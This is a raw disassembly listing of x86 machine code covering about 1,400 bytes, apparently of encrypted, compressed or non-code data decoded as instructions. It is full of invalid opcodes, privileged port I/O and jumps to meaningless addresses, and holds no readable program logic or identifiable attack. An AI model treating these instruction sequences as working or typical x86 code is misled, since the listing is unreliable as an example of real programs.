  403cb4:	ab                   	stos   %eax,%es:(%edi)
  403cb5:	c9                   	leave
  403cb6:	6a 4c                	push   $0x4c
  403cb8:	d4 8e                	aam    $0x8e
  403cba:	29 8e 2c 75 a3 d1    	sub    %ecx,-0x2e5c8ad4(%esi)
  403cc0:	3e 6a 4c             	ds push $0x4c
  403cc3:	b7 5c                	mov    $0x5c,%bh
  403cc5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403cc6:	68 5b 4f 46 48       	push   $0x48464f5b
  403ccb:	68 59 30 e5 b3       	push   $0xb3e53059
  403cd0:	44                   	inc    %esp
  403cd1:	67 98                	addr16 cwtl
  403cd3:	de db                	(bad)
  403cd5:	3d f7 83 d4 33       	cmp    $0x33d483f7,%eax
  403cda:	ef                   	out    %eax,(%dx)
  403cdb:	1c 71                	sbb    $0x71,%al
  403cdd:	2e 6c                	cs insb (%dx),%es:(%edi)
  403cdf:	f1                   	int1
  403ce0:	94                   	xchg   %eax,%esp
  403ce1:	4c                   	dec    %esp
  403ce2:	3d 98 9e 8a 96       	cmp    $0x968a9e98,%eax
  403ce7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403ce8:	53                   	push   %ebx
  403ce9:	9e                   	sahf
  403cea:	5b                   	pop    %ebx
  403ceb:	bc bc 75 cb 31       	mov    $0x31cb75bc,%esp
  403cf0:	fa                   	cli
  403cf1:	97                   	xchg   %eax,%edi
  403cf2:	79 4f                	jns    0x403d43
  403cf4:	1c 4f                	sbb    $0x4f,%al
  403cf6:	ca 62 20             	lret   $0x2062
  403cf9:	db bf d2 36 9f 89    	fstpt  -0x7660c92e(%edi)
  403cff:	e2 77                	loop   0x403d78
  403d01:	63 75 98             	arpl   %esi,-0x68(%ebp)
  403d04:	e5 8b                	in     $0x8b,%eax
  403d06:	20 6c 6f 55          	and    %ch,0x55(%edi,%ebp,2)
  403d0a:	8b f4                	mov    %esp,%esi
  403d0c:	38 9e 34 3a 43 54    	cmp    %bl,0x54433a34(%esi)
  403d12:	26 e2 61             	es loop 0x403d76
  403d15:	8a 4b 8c             	mov    -0x74(%ebx),%cl
  403d18:	f2 b5 da             	repnz mov $0xda,%ch
  403d1b:	69 63 a8 ec 6f 56 e4 	imul   $0xe4566fec,-0x58(%ebx),%esp
  403d22:	d1 b0 a6 58 4a d9    	shll   $1,-0x26b5a75a(%eax)
  403d28:	31 66 e3             	xor    %esp,-0x1d(%esi)
  403d2b:	41                   	inc    %ecx
  403d2c:	69 70 20 cb a6 41 d1 	imul   $0xd141a6cb,0x20(%eax),%esi
  403d33:	7e 07                	jle    0x403d3c
  403d35:	f6 9c c6 57 32 2c 70 	negb   0x702c3257(%esi,%eax,8)
  403d3c:	d3 3b                	sarl   %cl,(%ebx)
  403d3e:	6d                   	insl   (%dx),%es:(%edi)
  403d3f:	4a                   	dec    %edx
  403d40:	7a 31                	jp     0x403d73
  403d42:	e2 53                	loop   0x403d97
  403d44:	fa                   	cli
  403d45:	26 65 ef             	es gs out %eax,(%dx)
  403d48:	61                   	popa
  403d49:	2f                   	das
  403d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4b:	1a 98 20 3e 87 a8    	sbb    -0x5778c1e0(%eax),%bl
  403d51:	3f                   	aas
  403d52:	66 1d 77 de          	sbb    $0xde77,%ax
  403d56:	16                   	push   %ss
  403d57:	4c                   	dec    %esp
  403d58:	ae                   	scas   %es:(%edi),%al
  403d59:	1c 7a                	sbb    $0x7a,%al
  403d5b:	be cc f1 82 3c       	mov    $0x3c82f1cc,%esi
  403d60:	9e                   	sahf
  403d61:	42                   	inc    %edx
  403d62:	7e 8d                	jle    0x403cf1
  403d64:	51                   	push   %ecx
  403d65:	36 79 9e             	ss jns 0x403d06
  403d68:	86 b6 6f 64 68 9c    	xchg   %dh,-0x63979b91(%esi)
  403d6e:	2e 29 50 2c          	sub    %edx,%cs:0x2c(%eax)
  403d72:	78 11                	js     0x403d85
  403d74:	17                   	pop    %ss
  403d75:	0f 2c f1             	cvttps2pi %xmm1,%mm6
  403d78:	b4 8a                	mov    $0x8a,%ah
  403d7a:	ac                   	lods   %ds:(%esi),%al
  403d7b:	4d                   	dec    %ebp
  403d7c:	48                   	dec    %eax
  403d7d:	f7 cb d3 50 b5 f4    	test   $0xf4b550d3,%ebx
  403d83:	6f                   	outsl  %ds:(%esi),(%dx)
  403d84:	25 4a bd a3 d4       	and    $0xd4a3bd4a,%eax
  403d89:	75 d4                	jne    0x403d5f
  403d8b:	c3                   	ret
  403d8c:	01 62 7f             	add    %esp,0x7f(%edx)
  403d8f:	1c 89                	sbb    $0x89,%al
  403d91:	68 74 a2 d5 3b       	push   $0x3bd5a274
  403d96:	a3 cd cb a8 40       	mov    %eax,0x40a8cbcd
  403d9b:	5b                   	pop    %ebx
  403d9c:	d9 68 44             	fldcw  0x44(%eax)
  403d9f:	4e                   	dec    %esi
  403da0:	6a bd                	push   $0xffffffbd
  403da2:	34 2e                	xor    $0x2e,%al
  403da4:	bd a3 5e 3c cf       	mov    $0xcf3c5ea3,%ebp
  403da9:	98                   	cwtl
  403daa:	ea cd 01 a7 93 c9 51 	ljmp   $0x51c9,$0x93a701cd
  403db1:	a3 7f 2a 59 53       	mov    %eax,0x53592a7f
  403db6:	31 a5 86 b4 1b 26    	xor    %esp,0x261bb486(%ebp)
  403dbc:	ee                   	out    %al,(%dx)
  403dbd:	6e                   	outsb  %ds:(%esi),(%dx)
  403dbe:	19 c8                	sbb    %ecx,%eax
  403dc0:	75 4e                	jne    0x403e10
  403dc2:	d9 3b                	fnstcw (%ebx)
  403dc4:	8d 2b                	lea    (%ebx),%ebp
  403dc6:	00 42 4a             	add    %al,0x4a(%edx)
  403dc9:	f9                   	stc
  403dca:	b4 7d                	mov    $0x7d,%ah
  403dcc:	eb 9a                	jmp    0x403d68
  403dce:	7c 03                	jl     0x403dd3
  403dd0:	c7 b8 9e 30 73       	xbegin 0x7370dc8d,(bad)
  403dd5:	63 69 e5             	arpl   %ebp,-0x1b(%ecx)
  403dd8:	ca ab 74             	lret   $0x74ab
  403ddb:	6a 48                	push   $0x48
  403ddd:	e3 73                	jecxz  0x403e52
  403ddf:	2e 22 f5             	cs and %ch,%dh
  403de2:	6e                   	outsb  %ds:(%esi),(%dx)
  403de3:	ba 3e 9a d2 63       	mov    $0x63d29a3e,%edx
  403de8:	6e                   	outsb  %ds:(%esi),(%dx)
  403de9:	90                   	nop
  403dea:	dd 52 50             	fstl   0x50(%edx)
  403ded:	2a 4e 26             	sub    0x26(%esi),%cl
  403df0:	fd                   	std
  403df1:	52                   	push   %edx
  403df2:	c6                   	(bad)
  403df3:	0b f9                	or     %ecx,%edi
  403df5:	5e                   	pop    %esi
  403df6:	8d 6b 1d             	lea    0x1d(%ebx),%ebp
  403df9:	d2 5d ed             	rcrb   %cl,-0x13(%ebp)
  403dfc:	98                   	cwtl
  403dfd:	b2 df                	mov    $0xdf,%dl
  403dff:	2e 23 be d5 52 5f 2f 	and    %cs:0x2f5f52d5(%esi),%edi
  403e06:	15 8f 03 5f 24       	adc    $0x245f038f,%eax
  403e0b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403e0c:	fe                   	(bad)
  403e0d:	74 9f                	je     0x403dae
  403e0f:	4b                   	dec    %ebx
  403e10:	87 50 50             	xchg   %edx,0x50(%eax)
  403e13:	db 35 24 55 5a cc    	(bad) 0xcc5a5524
  403e19:	b2 41                	mov    $0x41,%dl
  403e1b:	70 ce                	jo     0x403deb
  403e1d:	e1 c0                	loope  0x403ddf
  403e1f:	fc                   	cld
  403e20:	72 94                	jb     0x403db6
  403e22:	fa                   	cli
  403e23:	4c                   	dec    %esp
  403e24:	9a 69 65 ae 7e 94 3d 	lcall  $0x3d94,$0x7eae6569
  403e2b:	4b                   	dec    %ebx
  403e2c:	b6 61                	mov    $0x61,%dh
  403e2e:	98                   	cwtl
  403e2f:	c4 56 37             	les    0x37(%esi),%edx
  403e32:	3d 8d 60 fb 5e       	cmp    $0x5efb608d,%eax
  403e37:	fb                   	sti
  403e38:	98                   	cwtl
  403e39:	b0 6f                	mov    $0x6f,%al
  403e3b:	58                   	pop    %eax
  403e3c:	95                   	xchg   %eax,%ebp
  403e3d:	2b 37                	sub    (%edi),%esi
  403e3f:	c8 34 40 47          	enter  $0x4034,$0x47
  403e43:	aa                   	stos   %al,%es:(%edi)
  403e44:	75 f6                	jne    0x403e3c
  403e46:	53                   	push   %ebx
  403e47:	7d 9b                	jge    0x403de4
  403e49:	c8 be 4d 69          	enter  $0x4dbe,$0x69
  403e4d:	55                   	push   %ebp
  403e4e:	3b 01                	cmp    (%ecx),%eax
  403e50:	46                   	inc    %esi
  403e51:	28 db                	sub    %bl,%bl
  403e53:	47                   	inc    %edi
  403e54:	55                   	push   %ebp
  403e55:	af                   	scas   %es:(%edi),%eax
  403e56:	13 90 3b 04 f3 60    	adc    0x60f3043b(%eax),%edx
  403e5c:	99                   	cltd
  403e5d:	77 61                	ja     0x403ec0
  403e5f:	79 a0                	jns    0x403e01
  403e61:	f8                   	clc
  403e62:	7f 20                	jg     0x403e84
  403e64:	b7 8c                	mov    $0x8c,%bh
  403e66:	4a                   	dec    %edx
  403e67:	aa                   	stos   %al,%es:(%edi)
  403e68:	85 2c 4b             	test   %ebp,(%ebx,%ecx,2)
  403e6b:	69 a1 8a fa 1f 38 df 	imul   $0xeee8d6df,0x381ffa8a(%ecx),%esp
  403e72:	d6 e8 ee 
  403e75:	74 ff                	je     0x403e76
  403e77:	b7 ae                	mov    $0xae,%bh
  403e79:	25 75 97 f5 0f       	and    $0xff59775,%eax
  403e7e:	cd 3c                	int    $0x3c
  403e80:	f3 a8 f4             	repz test $0xf4,%al
  403e83:	fe                   	(bad)
  403e84:	7d d4                	jge    0x403e5a
  403e86:	c3                   	ret
  403e87:	fa                   	cli
  403e88:	38 88 e4 bf ed a5    	cmp    %cl,-0x5a12401c(%eax)
  403e8e:	ff 5b d3             	lcall  *-0x2d(%ebx)
  403e91:	97                   	xchg   %eax,%edi
  403e92:	68 e7 0a c8 61       	push   $0x61c80ae7
  403e97:	08 6d 4c             	or     %ch,0x4c(%ebp)
  403e9a:	47                   	inc    %edi
  403e9b:	2a 07                	sub    (%edi),%al
  403e9d:	83 d2 e3             	adc    $0xffffffe3,%edx
  403ea0:	d2 fe                	sar    %cl,%dh
  403ea2:	0f 32                	rdmsr
  403ea4:	fa                   	cli
  403ea5:	59                   	pop    %ecx
  403ea6:	12 ad 58 88 bc c6    	adc    -0x394377a8(%ebp),%ch
  403eac:	81 71 d9 32 6a 7b 26 	xorl   $0x267b6a32,-0x27(%ecx)
  403eb3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403eb4:	eb a9                	jmp    0x403e5f
  403eb6:	55                   	push   %ebp
  403eb7:	8f                   	(bad)
  403eb8:	ec                   	in     (%dx),%al
  403eb9:	bd 8c f8 36 27       	mov    $0x2736f88c,%ebp
  403ebe:	9b                   	fwait
  403ebf:	6e                   	outsb  %ds:(%esi),(%dx)
  403ec0:	5c                   	pop    %esp
  403ec1:	ef                   	out    %eax,(%dx)
  403ec2:	d0 7f 48             	sarb   $1,0x48(%edi)
  403ec5:	84 f8                	test   %bh,%al
  403ec7:	de 56 65             	ficoms 0x65(%esi)
  403eca:	eb 04                	jmp    0x403ed0
  403ecc:	c5 f3 6b             	(bad)
  403ecf:	ef                   	out    %eax,(%dx)
  403ed0:	9b                   	fwait
  403ed1:	c8 54 00 f9          	enter  $0x54,$0xf9
  403ed5:	3c 49                	cmp    $0x49,%al
  403ed7:	16                   	push   %ss
  403ed8:	3c a5                	cmp    $0xa5,%al
  403eda:	f1                   	int1
  403edb:	b2 6d                	mov    $0x6d,%dl
  403edd:	19 bd 6d 71 64 6b    	sbb    %edi,0x6b64716d(%ebp)
  403ee3:	cb                   	lret
  403ee4:	42                   	inc    %edx
  403ee5:	79 e9                	jns    0x403ed0
  403ee7:	74 d2                	je     0x403ebb
  403ee9:	fe                   	(bad)
  403eea:	16                   	push   %ss
  403eeb:	b3 79                	mov    $0x79,%bl
  403eed:	40                   	inc    %eax
  403eee:	2a 10                	sub    (%eax),%dl
  403ef0:	3d d3 ba 4f e3       	cmp    $0xe34fbad3,%eax
  403ef5:	00 b2 7d 6e 89 d4    	add    %dh,-0x2b769183(%edx)
  403efb:	b1 74                	mov    $0x74,%cl
  403efd:	ce                   	into
  403efe:	11 90 e7 1c 55 9b    	adc    %edx,-0x64aae319(%eax)
  403f04:	d1 cd                	ror    $1,%ebp
  403f06:	c9                   	leave
  403f07:	60                   	pusha
  403f08:	be 8f c9 e7 49       	mov    $0x49e7c98f,%esi
  403f0d:	6e                   	outsb  %ds:(%esi),(%dx)
  403f0e:	a9 bf 83 d2 7a       	test   $0x7ad283bf,%eax
  403f13:	92                   	xchg   %eax,%edx
  403f14:	ac                   	lods   %ds:(%esi),%al
  403f15:	61                   	popa
  403f16:	00 52 3c             	add    %dl,0x3c(%edx)
  403f19:	0d e9 73 41 46       	or     $0x464173e9,%eax
  403f1e:	bd af 92 1c 51       	mov    $0x511c92af,%ebp
  403f23:	ee                   	out    %al,(%dx)
  403f24:	96                   	xchg   %eax,%esi
  403f25:	66 3f                	data16 aas
  403f27:	62 bb 49 ac 6d d9    	bound  %edi,-0x269253b7(%ebx)
  403f2d:	3c 4f                	cmp    $0x4f,%al
  403f2f:	5c                   	pop    %esp
  403f30:	b9 28 ff a7 44       	mov    $0x44a7ff28,%ecx
  403f35:	19 35 aa d3 5c c8    	sbb    %esi,0xc85cd3aa
  403f3b:	a2 25 be 56 53       	mov    %al,0x5356be25
  403f40:	5c                   	pop    %esp
  403f41:	16                   	push   %ss
  403f42:	77 23                	ja     0x403f67
  403f44:	5c                   	pop    %esp
  403f45:	55                   	push   %ebp
  403f46:	b6 2e                	mov    $0x2e,%dh
  403f48:	ea b1 ad 5e d6 4c 56 	ljmp   $0x564c,$0xd65eadb1
  403f4f:	45                   	inc    %ebp
  403f50:	e7 e6                	out    %eax,$0xe6
  403f52:	ff 14 44             	call   *(%esp,%eax,2)
  403f55:	ca f3 65             	lret   $0x65f3
  403f58:	64 65 26 2f          	fs gs es das
  403f5c:	49                   	dec    %ecx
  403f5d:	46                   	inc    %esi
  403f5e:	57                   	push   %edi
  403f5f:	43                   	inc    %ebx
  403f60:	2f                   	das
  403f61:	e7 aa                	out    %eax,$0xaa
  403f63:	a9 97 01 b7 f6       	test   $0xf6b70197,%eax
  403f68:	21 f6                	and    %esi,%esi
  403f6a:	aa                   	stos   %al,%es:(%edi)
  403f6b:	ce                   	into
  403f6c:	11 82 55 c7 46 d7    	adc    %eax,-0x28b938ab(%edx)
  403f72:	8a a2 89 96 7b 43    	mov    0x437b9689(%edx),%ah
  403f78:	d5 b3                	aad    $0xb3
  403f7a:	01 dc                	add    %ebx,%esp
  403f7c:	8e d3                	mov    %ebx,%ss
  403f7e:	64 89 de             	fs mov %ebx,%esi
  403f81:	32 0f                	xor    (%edi),%cl
  403f83:	25 4d 19 49 2b       	and    $0x2b49194d,%eax
  403f88:	1b e4                	sbb    %esp,%esp
  403f8a:	bf 44 6f 41 99       	mov    $0x99416f44,%edi
  403f8f:	7d 93                	jge    0x403f24
  403f91:	c3                   	ret
  403f92:	50                   	push   %eax
  403f93:	53                   	push   %ebx
  403f94:	83 a8 e6 51 9a eb ec 	subl   $0xffffffec,-0x1465ae1a(%eax)
  403f9b:	75 2d                	jne    0x403fca
  403f9d:	2c ab                	sub    $0xab,%al
  403f9f:	95                   	xchg   %eax,%ebp
  403fa0:	d2 7c 53 d7          	sarb   %cl,-0x29(%ebx,%edx,2)
  403fa4:	88 12                	mov    %dl,(%edx)
  403fa6:	8b 98 6a 59 a8 a7    	mov    -0x5857a696(%eax),%ebx
  403fac:	b5 0f                	mov    $0xf,%ch
  403fae:	24 a4                	and    $0xa4,%al
  403fb0:	cb                   	lret
  403fb1:	c6                   	(bad)
  403fb2:	a1 3a c7 f2 d1       	mov    0xd1f2c73a,%eax
  403fb7:	80 fb 5a             	cmp    $0x5a,%bl
  403fba:	66 74 a8             	data16 je 0x403f65
  403fbd:	47                   	inc    %edi
  403fbe:	c9                   	leave
  403fbf:	e7 d0                	out    %eax,$0xd0
  403fc1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403fc2:	1b 44 3b 6a          	sbb    0x6a(%ebx,%edi,1),%eax
  403fc6:	f3 e7 12             	repz out %eax,$0x12
  403fc9:	b4 77                	mov    $0x77,%ah
  403fcb:	85 a9 16 b5 ef ab    	test   %ebp,-0x54104aea(%ecx)
  403fd1:	5b                   	pop    %ebx
  403fd2:	26 28 3f             	sub    %bh,%es:(%edi)
  403fd5:	2f                   	das
  403fd6:	f4                   	hlt
  403fd7:	79 ab                	jns    0x403f84
  403fd9:	a3 2f 79 24 97       	mov    %eax,0x9724792f
  403fde:	d5 2f                	aad    $0x2f
  403fe0:	4c                   	dec    %esp
  403fe1:	f9                   	stc
  403fe2:	75 f4                	jne    0x403fd8
  403fe4:	a0 de 3d 1b 93       	mov    0x931b3dde,%al
  403fe9:	94                   	xchg   %eax,%esp
  403fea:	5f                   	pop    %edi
  403feb:	36 08 ee             	ss or  %ch,%dh
  403fee:	1d 4c 4d 26 6f       	sbb    $0x6f264d4c,%eax
  403ff3:	18 68 16             	sbb    %ch,0x16(%eax)
  403ff6:	5c                   	pop    %esp
  403ff7:	bd b4 ba c6 bd       	mov    $0xbdc6bab4,%ebp
  403ffc:	4e                   	dec    %esi
  403ffd:	40                   	inc    %eax
  403ffe:	18 00                	sbb    %al,(%eax)
  404000:	e5 cb                	in     $0xcb,%eax
  404002:	ef                   	out    %eax,(%dx)
  404003:	d3 86 68 d3 44 6b    	roll   %cl,0x6b44d368(%esi)
  404009:	18 51 fb             	sbb    %dl,-0x5(%ecx)
  40400c:	26 de a7 34 06 6c a7 	fisubs %es:-0x5893f9cc(%edi)
  404013:	ce                   	into
  404014:	41                   	inc    %ecx
  404015:	df d3                	(bad)
  404017:	fe                   	(bad)
  404018:	17                   	pop    %ss
  404019:	0f 74 20             	pcmpeqb (%eax),%mm4
  40401c:	eb ee                	jmp    0x40400c
  40401e:	5e                   	pop    %esi
  40401f:	5a                   	pop    %edx
  404020:	4d                   	dec    %ebp
  404021:	1a 3f                	sbb    (%edi),%bh
  404023:	0f 4c 63 74          	cmovl  0x74(%ebx),%esp
  404027:	ae                   	scas   %es:(%edi),%al
  404028:	fc                   	cld
  404029:	5f                   	pop    %edi
  40402a:	69 f7 98 ed 4f 8f    	imul   $0x8f4fed98,%edi,%esi
  404030:	86 98 d3 58 ee dd    	xchg   %bl,-0x2211a72d(%eax)
  404036:	23 5c 6f 5c          	and    0x5c(%edi,%ebp,2),%ebx
  40403a:	cc                   	int3
  40403b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40403c:	85 5c ad 69          	test   %ebx,0x69(%ebp,%ebp,4)
  404040:	2a bf 5c bb d6 34    	sub    0x34d6bb5c(%edi),%bh
  404046:	21 2e                	and    %ebp,(%esi)
  404048:	27                   	daa
  404049:	4b                   	dec    %ebx
  40404a:	dd 75 df             	fnsave -0x21(%ebp)
  40404d:	72 fd                	jb     0x40404c
  40404f:	6f                   	outsl  %ds:(%esi),(%dx)
  404050:	a9 18 11 62 1d       	test   $0x1d621118,%eax
  404055:	53                   	push   %ebx
  404056:	e6 be                	out    %al,$0xbe
  404058:	55                   	push   %ebp
  404059:	71 fd                	jno    0x404058
  40405b:	ad                   	lods   %ds:(%esi),%eax
  40405c:	10 1e                	adc    %bl,(%esi)
  40405e:	6a ae                	push   $0xffffffae
  404060:	73 e6                	jae    0x404048
  404062:	7b a6                	jnp    0x40400a
  404064:	7d de                	jge    0x404044
  404066:	5d                   	pop    %ebp
  404067:	d3 6a af             	shrl   %cl,-0x51(%edx)
  40406a:	69 db 90 ad 79 28    	imul   $0x2879ad90,%ebx,%ebx
  404070:	ae                   	scas   %es:(%edi),%al
  404071:	12 de                	adc    %dh,%bl
  404073:	34 8c                	xor    $0x8c,%al
  404075:	6d                   	insl   (%dx),%es:(%edi)
  404076:	43                   	inc    %ebx
  404077:	e4 7e                	in     $0x7e,%al
  404079:	58                   	pop    %eax
  40407a:	44                   	inc    %esp
  40407b:	7e 7e                	jle    0x4040fb
  40407d:	9c                   	pushf
  40407e:	f2 e5 4a             	repnz in $0x4a,%eax
  404081:	5f                   	pop    %edi
  404082:	c3                   	ret
  404083:	e4 0d                	in     $0xd,%al
  404085:	93                   	xchg   %eax,%ebx
  404086:	fa                   	cli
  404087:	7b ea                	jnp    0x404073
  404089:	b7 25                	mov    $0x25,%bh
  40408b:	7d 1a                	jge    0x4040a7
  40408d:	35 4f 22 49 6e       	xor    $0x6e49224f,%eax
  404092:	63 6a 3c             	arpl   %ebp,0x3c(%edx)
  404095:	ac                   	lods   %ds:(%esi),%al
  404096:	4f                   	dec    %edi
  404097:	f3 f6 29             	repz imulb (%ecx)
  40409a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40409b:	54                   	push   %esp
  40409c:	2e 62 96 2f 6d 0d 0d 	bound  %edx,%cs:0xd0d6d2f(%esi)
  4040a3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4040a4:	9c                   	pushf
  4040a5:	d0 63 a0             	shlb   $1,-0x60(%ebx)
  4040a8:	bd 33 e8 77 db       	mov    $0xdb77e833,%ebp
  4040ad:	be 86 49 fd 19       	mov    $0x19fd4986,%esi
  4040b2:	f5                   	cmc
  4040b3:	fb                   	sti
  4040b4:	9a 22 de 16 fb 3b 64 	lcall  $0x643b,$0xfb16de22
  4040bb:	aa                   	stos   %al,%es:(%edi)
  4040bc:	27                   	daa
  4040bd:	8c 49 be             	mov    %cs,-0x42(%ecx)
  4040c0:	8e b2 2e c4 fe 0d    	mov    0xdfec42e(%edx),%?
  4040c6:	8a 7a 2a             	mov    0x2a(%edx),%bh
  4040c9:	7d 5b                	jge    0x404126
  4040cb:	1a b1 c3 f2 67 3a    	sbb    0x3a67f2c3(%ecx),%dh
  4040d1:	0f 0b                	ud2
  4040d3:	f3 3a 92 e8 9c f9 5f 	repz cmp 0x5ff99ce8(%edx),%dl
  4040da:	76 a0                	jbe    0x40407c
  4040dc:	79 5c                	jns    0x40413a
  4040de:	95                   	xchg   %eax,%ebp
  4040df:	79 9c                	jns    0x40407d
  4040e1:	f4                   	hlt
  4040e2:	72 b9                	jb     0x40409d
  4040e4:	d8 ee                	fsubr  %st(6),%st
  4040e6:	fe                   	(bad)
  4040e7:	ee                   	out    %al,(%dx)
  4040e8:	5f                   	pop    %edi
  4040e9:	83 45 74 d3          	addl   $0xffffffd3,0x74(%ebp)
  4040ed:	21 44 44 c5          	and    %eax,-0x3b(%esp,%eax,2)
  4040f1:	f5                   	cmc
  4040f2:	dd c7                	ffree  %st(7)
  4040f4:	4c                   	dec    %esp
  4040f5:	c5 42 d6             	lds    -0x2a(%edx),%eax
  4040f8:	2e 54                	cs push %esp
  4040fa:	61                   	popa
  4040fb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4040fc:	fb                   	sti
  4040fd:	ee                   	out    %al,(%dx)
  4040fe:	60                   	pusha
  4040ff:	6a 5a                	push   $0x5a
  404101:	89 47 07             	mov    %eax,0x7(%edi)
  404104:	d9 3f                	fnstcw (%edi)
  404106:	17                   	pop    %ss
  404107:	5a                   	pop    %edx
  404108:	7e 4b                	jle    0x404155
  40410a:	3d 39 69 67 6f       	cmp    $0x6f676939,%eax
  40410f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404110:	12 4a 56             	adc    0x56(%edx),%cl
  404113:	73 5c                	jae    0x404171
  404115:	49                   	dec    %ecx
  404116:	13 90 d9 4a 53 a2    	adc    -0x5dacb527(%eax),%edx
  40411c:	25 ba 5f 93 d5       	and    $0xd5935fba,%eax
  404121:	b6 ec                	mov    $0xec,%dh
  404123:	18 39                	sbb    %bh,(%ecx)
  404125:	b2 be                	mov    $0xbe,%dl
  404127:	65 4f                	gs dec %edi
  404129:	10 57 3a             	adc    %dl,0x3a(%edi)
  40412c:	d5 bc                	aad    $0xbc
  40412e:	40                   	inc    %eax
  40412f:	cf                   	iret
  404130:	6b 9a e8 4b 10 b6 b3 	imul   $0xffffffb3,-0x49efb418(%edx),%ebx
  404137:	05 d8 1e d6 76       	add    $0x76d61ed8,%eax
  40413c:	af                   	scas   %es:(%edi),%eax
  40413d:	62 3a                	bound  %edi,(%edx)
  40413f:	d7                   	xlat   %ds:(%ebx)
  404140:	7a 4d                	jp     0x40418f
  404142:	9b                   	fwait
  404143:	28 bb 6f 50 2d be    	sub    %bh,-0x41d2af91(%ebx)
  404149:	9c                   	pushf
  40414a:	29 14 b3             	sub    %edx,(%ebx,%esi,4)
  40414d:	05 9a b5 55 6d       	add    $0x6d55b59a,%eax
  404152:	e7 7f                	out    %eax,$0x7f
  404154:	e5 5f                	in     $0x5f,%eax
  404156:	9c                   	pushf
  404157:	2e 15 53 44 30 f5    	cs adc $0xf5304453,%eax
  40415d:	6e                   	outsb  %ds:(%esi),(%dx)
  40415e:	7f 76                	jg     0x4041d6
  404160:	9e                   	sahf
  404161:	2c 87                	sub    $0x87,%al
  404163:	4e                   	dec    %esi
  404164:	bd fe 15 d7 52       	mov    $0x52d715fe,%ebp
  404169:	a1 6f 13 df 57       	mov    0x57df136f,%eax
  40416e:	f9                   	stc
  40416f:	b7 a8                	mov    $0xa8,%bh
  404171:	be 20 58 0d 49       	mov    $0x490d5820,%esi
  404176:	3e 0c 49             	ds or  $0x49,%al
  404179:	8b 6a dd             	mov    -0x23(%edx),%ebp
  40417c:	bc 1e 93 c9 64       	mov    $0x64c9931e,%esp
  404181:	9d                   	popf
  404182:	51                   	push   %ecx
  404183:	41                   	inc    %ecx
  404184:	b8 f6 ed 95 58       	mov    $0x5895edf6,%eax
  404189:	b0 9d                	mov    $0x9d,%al
  40418b:	bf ad 18 22 9d       	mov    $0x9d2218ad,%edi
  404190:	7e 2e                	jle    0x4041c0
  404192:	76 c7                	jbe    0x40415b
  404194:	cd 1f                	int    $0x1f
  404196:	83 3d 59 0e 95 6f 68 	cmpl   $0x68,0x6f950e59
  40419d:	ab                   	stos   %eax,%es:(%edi)
  40419e:	17                   	pop    %ss
  40419f:	6a de                	push   $0xffffffde
  4041a1:	47                   	inc    %edi
  4041a2:	ef                   	out    %eax,(%dx)
  4041a3:	9f                   	lahf
  4041a4:	ed                   	in     (%dx),%eax
  4041a5:	08 0d 26 76 9f 5e    	or     %cl,0x5e9f7626
  4041ab:	07                   	pop    %es
  4041ac:	90                   	nop
  4041ad:	72 43                	jb     0x4041f2
  4041af:	89 ed                	mov    %ebp,%ebp
  4041b1:	bc 73 52 c3 4d       	mov    $0x4dc35273,%esp
  4041b6:	4d                   	dec    %ebp
  4041b7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4041b8:	49                   	dec    %ecx
  4041b9:	fc                   	cld
  4041ba:	3d 42 6f b3 e3       	cmp    $0xe3b36f42,%eax
  4041bf:	da 47 b5             	fiaddl -0x4b(%edi)
  4041c2:	b7 e5                	mov    $0xe5,%bh
  4041c4:	18 1e                	sbb    %bl,(%esi)
  4041c6:	17                   	pop    %ss
  4041c7:	6a 4a                	push   $0x4a
  4041c9:	d7                   	xlat   %ds:(%ebx)
  4041ca:	d4 a3                	aam    $0xa3
  4041cc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4041cd:	61                   	popa
  4041ce:	11 b4 db 73 a1 f6 be 	adc    %esi,-0x41095e8d(%ebx,%ebx,8)
  4041d5:	7a 58                	jp     0x40422f
  4041d7:	04 ed                	add    $0xed,%al
  4041d9:	6a d2                	push   $0xffffffd2
  4041db:	32 b6 2c 82 96 a7    	xor    -0x58697dd4(%esi),%dh
  4041e1:	6a d9                	push   $0xffffffd9
  4041e3:	54                   	push   %esp
  4041e4:	3f                   	aas
  4041e5:	3f                   	aas
  4041e6:	69 d4 9f 50 b6 b8    	imul   $0xb8b6509f,%esp,%edx
  4041ec:	ee                   	out    %al,(%dx)
  4041ed:	d4 12                	aam    $0x12
  4041ef:	d7                   	xlat   %ds:(%ebx)
  4041f0:	cb                   	lret
  4041f1:	6b d9 53             	imul   $0x53,%ecx,%ebx
  4041f4:	46                   	inc    %esi
  4041f5:	e2 3a                	loop   0x404231
  4041f7:	4f                   	dec    %edi
  4041f8:	6b 50 22 3b          	imul   $0x3b,0x22(%eax),%edx
  4041fc:	bf 79 1c 54 5e       	mov    $0x5e541c79,%edi
  404201:	fa                   	cli
  404202:	ee                   	out    %al,(%dx)
  404203:	d3 f6                	shl    %cl,%esi
  404205:	ec                   	in     (%dx),%al
  404206:	fc                   	cld
  404207:	e3 50                	jecxz  0x404259
  404209:	10 56 b2             	adc    %dl,-0x4e(%esi)
  40420c:	6b f1 ff             	imul   $0xffffffff,%ecx,%esi
  40420f:	14 58                	adc    $0x58,%al
  404211:	d7                   	xlat   %ds:(%ebx)
  404212:	3c 64                	cmp    $0x64,%al
  404214:	ef                   	out    %eax,(%dx)
  404215:	52                   	push   %edx
  404216:	ec                   	in     (%dx),%al
  404217:	b6 48                	mov    $0x48,%dh
  404219:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40421a:	2d f3 b7 f3 0f       	sub    $0xff3b7f3,%eax
  40421f:	16                   	push   %ss
  404220:	64 ff 48 f6          	decl   %fs:-0xa(%eax)
  404224:	50                   	push   %eax
  404225:	5a                   	pop    %edx
  404226:	29 bb 1c 18 65 ce    	sub    %edi,-0x319ae7e4(%ebx)
  40422c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40422d:	79 b9                	jns    0x4041e8
